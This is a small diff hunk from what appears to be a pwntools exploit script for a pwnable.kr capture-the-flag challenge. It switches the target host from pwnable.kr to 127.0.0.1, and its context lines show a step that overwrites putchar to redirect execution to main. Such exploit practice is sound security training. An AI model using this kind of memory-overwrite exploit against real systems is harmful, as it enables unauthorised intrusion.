@@ -62,7 +62,7 @@ write(4) # Overwrite putchar -> main
 out(1)
 
 # Connect...
-host = 'pwnable.kr'
+host = '127.0.0.1'
 port = 9001
 conn = pwn.remote(host, port)
 conn.recvline()
